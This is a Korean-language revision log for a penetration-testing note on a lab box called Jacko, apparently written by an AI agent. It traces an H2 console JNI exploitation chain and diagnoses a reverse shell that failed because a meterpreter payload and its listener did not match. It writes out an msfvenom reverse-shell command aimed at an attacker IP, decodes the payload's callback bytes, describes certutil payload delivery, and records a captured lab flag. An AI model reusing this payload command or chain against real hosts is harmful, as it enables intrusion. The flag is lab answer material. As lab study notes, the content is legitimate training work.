# Jacko 노트 개작 — 작업 기록

**작업일** 2026-08-20 · **대상** `03. PG\Jacko.md` (314행 → 812행) · **백업** `03. PG\Jacko.md.bak`

---

## 1. 도달 지점 판정 — **부분 완료 1/2**

`_STATUS.md` 는 `0/2 (노트O)` = 미착수로 적어놨다. **틀렸다.**

`local.txt` 를 실제로 읽은 스크린샷이 볼트에 있다.

- 파일: `파일보관\Pasted image 20260710170741.png` (mtime 2026-07-10 17:07:41)
- 화면 내용: `c:\Users` 디렉터리 목록 → `cd tony` → `cd desktop` → `type local.txt`
- 값: `dc9bb9f7d40681ebf2db1589d6ca40f0`

`proof.txt` 는 없다. 시도한 기록도 없다. 2026-07-10 이후 이 박스 관련 스크린샷·산출물이 전무하다(다음 스크린샷은 07-13, 다른 박스).

→ **완료 32 → 33 이 아니라, 부분 완료 1 → 2 로 옮겨야 한다.** Flu 와 같은 칸.

⚠️ 플래그 값은 스크린샷에서 눈으로 옮긴 것이다. 제출 전 총괄이 살아 있는 셸에서 재확인할 것(CLAUDE.md §8).

---

## 2. 산출물에만 있었고 기존 노트에 없던 것

### (a) 리버스셸이 54분간 안 붙은 **진짜 원인** — 확정됐다

기존 노트는 `msfvenom ... LPORT=8082` 한 줄만 적어놓고 실패 기록이 전혀 없었다. 총괄 지시는 "`rev.exe`/`reverse.exe` 가 둘 다 7680바이트, 15분 간격 = 첫 것이 안 붙어 다시 만든 정황"이었다. **그 전제도 결과적으로 빗나갔다** — 두 파일 모두 타겟에 전달된 적이 없다.

증거 사슬:

1. `파일보관\Pasted image 20260710162931.png` — JNI eval 로 실행한 certutil 의 반환 문자열 마지막이 `03a200`.
2. `0x03a200` = **238,080 바이트**. 남아 있는 두 exe 는 둘 다 **7,680 바이트**다.
3. `~/.zsh_history` 1792행 = `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o reverse.exe`. Kali 에서 그대로 재실행 → `Final size of exe file: 238080 bytes`. **정확히 일치.**
4. 히스토리 1792~1810행(이 박스 구간)에 **4444 리스너도 `multi/handler` 도 없다.** 히스토리 전체에 `msfconsole` 이 한 줄도 없고 `~/.msf4/loot` 도 비어 있다.

→ 16:10 과 16:29 에 타겟이 받아간 `reverse.exe` 는 **meterpreter/4444 판**이었다. 리스너는 nc 로 135·8082 에 걸려 있었다. 포트도 핸들러 종류도 어긋났으니 붙을 수가 없다.

`-o reverse.exe` 를 세 번 덮어쓰면서 무엇이 마지막인지 놓친 것이 원인이다. 노트 §6 의 중심 교훈으로 세웠다.

### (b) 페이로드 두 개의 정체 — 바이트로 특정

```
diff <(xxd rev.exe) <(xxd reverse.exe)
431c431
< 00001ae0: 0049 89e5 49bc 0200 0087 c0a8 2dd7 4154
> 00001ae0: 0049 89e5 49bc 0200 1f92 c0a8 2dd7 4154
```

`49bc` 뒤가 `sockaddr_in`: `0200`=AF_INET, 포트 `0087`=**135** / `1f92`=**8082**, IP `c0a82dd7`=192.168.45.215.

부수 확인 — 같은 인자로 두 번 빌드하면 md5 가 다르다(섹션 이름 무작위 + PE 체크섬). **md5 로 페이로드를 식별하려 들면 안 된다.**

### (c) JNI 체인 3단계의 실제 화면

기존 노트가 "write 부분 입력"·"load 부분 입력" 캡션만 달아둔 스크린샷 두 장의 내용을 본문에 옮겼다(`CSVWRITE` / `System_load` + 응답 `null`). `System.load` 의 반환값 `null` 이 **성공**이라는 점을 명시 — 여기서 실패로 오독하기 쉽다.

### (d) 접속 화면에서 읽히는 것

`Pasted image 20260710161232.png` — 로그인 폼이 아니라 **JDBC 파라미터 입력창**(드라이버 클래스 / JDBC URL / 사용자명 / 비밀번호, 기본 `jdbc:h2:~/test` + `sa`). 기존 노트는 "H2 초기 패스워드"로만 처리했다.

`Pasted image 20260710161324.png` — `H2 1.4.199 (2019-03-13)`.

### (e) nmap 지문만으로 버전을 알 수 있었다

기존 노트는 nmap 원문을 붙여만 놨다. 9092 의 `SF-` 지문을 UTF-16 로 디코드하면:

```
org.h2.jdbc.JdbcSQLNonTransientConnectionException: Remote connections to this server
are not allowed, see -tcpAllowOthers [90117-199]
```

꼬리의 `-199` 가 콘솔의 1.4.199 와 맞는다. 동시에 **9092 는 원격 접속 차단** = 막다른 길임이 스캔 단계에서 판명된다.

### (f) `whatweb.txt`

기존 노트에 없던 산출물. 새 정보는 없지만 §1 에 넣었다.

### (g) certutil 목적지가 두 곳

`C:\Windows\Temp\reverse.exe`(16:29, meterpreter 판) 와 `C:\Users\tony\Desktop\reverse.exe`(실행된 판). 기존 노트는 Desktop 것만 적어놨고, 파일 내용이 달랐다는 사실은 아예 없었다.

---

## 3. 반증한 것

### 3-1. 기존 노트 / `_STATUS.md` 가 틀렸던 것

| 항목 | 기존 기술 | 실제 |
|---|---|---|
| `_STATUS.md` | Jacko `0/2` 미착수 | **1/2 부분 완료.** `local.txt` 획득 스크린샷 존재 |
| frontmatter | `status: unsolved` | `local.txt` 를 읽었으므로 부분 완료. Flu 선례에 맞춰 `status: solved` + 상단 요약에 "2개 중 1개" 명시 |
| 노트 본문 | 시행착오 기록 **전무** | 54분짜리 페이로드 혼동이 있었다 |
| 노트 첫머리 | 정체불명의 `certutil ... shell.exe` 코드블록이 nmap 바로 뒤에 떠 있음 | 실행 기록이 아니라 **템플릿 메모**다. §3 에 그렇게 표시해 보존 |

### 3-2. 총괄 지시 중 틀렸던 것

> "`rev.exe` 와 `reverse.exe` 가 둘 다 7680바이트다. 15분 간격으로 두 번 만들었다는 뜻이다 — **첫 것이 안 붙어서 다시 만든 정황**이다."

전제는 맞지만 **결론이 좁았다.** 두 파일은 서로 실패/재시도 관계가 아니다. `rev.exe`(135)는 타겟에 전달된 흔적조차 없고, `reverse.exe`(17:01)는 성공한 판이다. **실패한 것은 이 둘이 아니라 그 이전에 같은 이름으로 존재하던 238KB meterpreter 판**이었다. 증거는 산출물이 아니라 **스크린샷 안의 certutil 오프셋**에 있었다.

> "`49384.txt` 가 125KB 인 것은 exploit-db 페이지를 통째로 저장했거나 익스플로잇 본문이 크다는 뜻이다."

후자다. 22행짜리 텍스트인데 15행이 DLL 전체를 `CHAR(0x..)` 로 풀어 쓴 **한 줄 64,895자**다. 그리고 **받아만 놓고 버린 것이 아니라 그대로 썼다** — 스크린샷 3장이 이 파일의 SQL 을 그대로 실행한 화면이다.

### 3-3. 내 초고가 틀렸던 것

| 초고 | 반증 |
|---|---|
| "왜 첫 8082 판이 안 붙고 재빌드한 8082 판이 붙었는지는 기록으로 설명되지 않는다. 리스너가 안 떠 있었을 것이다 `[가정]`" | certutil 오프셋 `03a200` = 238,080 = meterpreter 빌드 크기. **`[가정]` 을 통째로 폐기하고 실측으로 대체.** |
| "8082 콘솔 화면(16:12)이 feroxbuster 완료 전에 찍혔다 — 기다리는 동안 8082 를 열어본 것이 진행을 만들었다" | feroxbuster 는 ~15:45–16:05. 16:12 는 **완료 후**다. 병행 진행의 증거는 콘솔 화면이 아니라 `49384.txt` 의 mtime **15:50:27** 이다 |
| "코드 실행 확인은 16:29(certutil 화면)" | `http.server` 로그 스크린샷이 **16:10:29** 에 타겟의 GET 을 찍었다. 체인은 그 이전에 이미 돌았다. 32분 만에 코드 실행 |
| xxd diff 블록의 한 줄을 `.mzyj → .bgoe` 로 요약해 붙임 | **실측 블록 변조다.** 원문 그대로 복구 |
| `head -16 49382.ps1` 출력에서 `# Vendor Hompage:` 행을 누락 | 원문 복구 |
| `grep -n -B1 ... searchsploit` 출력을 3행으로 적음 | `-B1` 은 2행이다. 실제 실행해 복구 |
| "msfvenom 은 `-o` 없이 stdout 으로 뱉을 때 진행 배너를 stderr 로 보낸다" (차이가 있는 것처럼 서술) | 배너는 **양쪽 다** stderr. 유일한 차이는 `-o` 일 때만 `Saved as:` 가 추가된다는 것. 직접 실행해 확인 |
| "같은 초 GET 2회는 `certutil -urlcache -split` 의 정상 동작 패턴" | 근거 없음. "이유는 확정되지 않는다"로 강등 |

---

## 4. 검증한 단정형 일반 지식 (전부 Kali 에서 실행)

| 주장 | 확인 방법 | 결과 |
|---|---|---|
| meterpreter x64 exe 크기 = 238,080 | `msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f exe` 재실행 | 일치 |
| `searchsploit -m` 은 mtime 을 보존하지 않는다 | `/usr/bin/searchsploit:958` = `cp -i` (`-p` 아님) + 원본 mtime 2025-12-17 | 확인 |
| 같은 msfvenom 인자로도 md5 가 달라진다 | 2회 빌드 후 `md5sum` | 확인 |
| `python -m http.server 80` 이 sudo 없이 뜬 이유 | `sysctl net.ipv4.ip_unprivileged_port_start` = 0 | 확인 |
| EDB 49382 의 정체 | `head` 로 헤더 확인 — PaperStream IP TWAIN LPE, **CVE-2018-16156**, `FJTWSVIC` + 파이프 `FjtwMkic_Fjicube_32` | 확인 |
| 볼트 치트시트의 `-a x86` | 49382 헤더 자신은 **x64** DLL 을 권한다 | 노트에 불일치 명시 |

**확인 못 해 `[가정]` 으로 남긴 것**: H2 의 `[에러코드-빌드번호]` 관례 · `jdbc:h2:~/test` 자동 생성 동작 · `CreateProcess` 탐색 순서로 인한 `whoami` 미발견 · `webAllowOthers` 옵션명 · 열거 없이 세션이 끝났다는 정황 · `CSVWRITE` 시그니처.

---

## 5. 총괄 판단이 필요한 것

**태그 taxonomy 공백** — `tech/db/mysql`·`tech/db/mssql` 은 있는데 `tech/db/h2` 가 없다. 이 박스의 정의적 기술인데 검색 색인에 안 잡힌다. 공유 인프라라 손대지 않았다. 승인하면 `tech/db/h2` 를 추가하고 frontmatter 에 넣겠다. `tech/lolbin/certutil` 계열도 볼트 전체에 없다(Access·Slort 등도 certutil 을 쓴다면 함께 검토할 값어치가 있다).

---

## 6. 상호 링크

- `Jacko.md` → Flu · Kevin · Slort · Access · Squid · Hub · Levram · RubyDome · Twiggy · Crane · Astronaut · Exghost · Hawat
- `Flu.md` 에 `[[Jacko]]` 역링크 1행 추가 (부분 완료 짝)
- `Kevin.md` 는 이미 `[[Jacko]]` 를 링크하고 있었다 — 손대지 않음

누적 패턴 편입: **"버전 판정은 독립 근거 2개"**(nmap `[90117-199]` + 콘솔 `1.4.199`), **"응답이 성공을 뜻하지 않는다"의 거울상**(`System_load` → `null` 이 성공).

---

## 7. 파이프라인

`python extract.py` 정상 → `refresh.ps1` 정상(색인 7종 재생성). `manual_tags`·`manual_cves` 둘 다 살아남았고, 본문에서 반증·비교로만 언급한 **CVE-2018-16156 이 CVE 색인에 새지 않았음**을 확인했다. 스크린샷 embed 9개 전부 보존(원본과 동일 집합).
